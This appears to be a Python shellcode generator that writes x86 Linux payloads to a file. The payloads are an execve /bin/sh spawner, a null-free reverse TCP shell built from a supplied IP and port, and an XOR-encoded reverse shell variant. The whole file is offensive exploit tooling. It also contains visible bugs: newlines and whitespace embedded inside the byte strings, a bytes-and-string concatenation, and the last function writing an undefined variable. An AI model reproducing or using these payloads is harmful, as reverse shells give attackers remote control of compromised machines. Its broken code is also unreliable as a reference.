#=============================================
#  _                _                       _ 
# | |              | |                     | |
# | | __  __ _   __| |  __ _ __   __ _   _ | |
# | |/ / / _` | / _` | / _` |\ \ / /| | | || |
# |   < | (_| || (_| || (_| | \ V / | |_| || |
# |_|\_\ \__,_| \__,_| \__,_|  \_/   \__,_||_|
#                                        
#=============================================
#!/bin/python3
import socket

def write_exp(shell):
    with open('shellcode.exp','wb') as file:
        file.write(shell)
   
def spawn_shell():
    #25 bytes shellcode :)
    shell_spawn=b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
    write_exp(shell_spawn)

def rev_tcp_no_null(ip,port):
    ip =socket.inet_aton(ip)    
    port=bytes.fromhex('{0:04x}'.format(port))
    #91 bytes shellcode :)
    rev_tcp_no_null=b"""\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x52\x52\x68"""+ip+b"""\x66\x68"""+port+b"""\x66\x6a\x02\x31\xc0\x89\xc3\x66\xb8\x67\x01
                       \xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xca\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80
                       \x75\xf6\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
                    """
    write_exp(rev_tcp_no_null)

def rev_tcp_xor(A,B,port):
    #xor hex(ip) with another hex(A)  -> hex(B)=hex(ip) xor hex(A) 
    # [ hex(A) and hex(B) should be null free] 
    #99bytes shellcode :)
    rev_tcp_xor=b"""\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x52\x52\xb8"""+B+b"""\xbb"""+A+b"""\x31\xd8\x50\x66\x68"""+port+"""\x66\x6a\x02
                   \x31\xc0\x89\xc3\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xca\xcd\x80\x31\xc9\xb1\x03
                   \x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0
                   \x0b\xcd\x80
                """
    write_exp(rev_tcp_no_null)

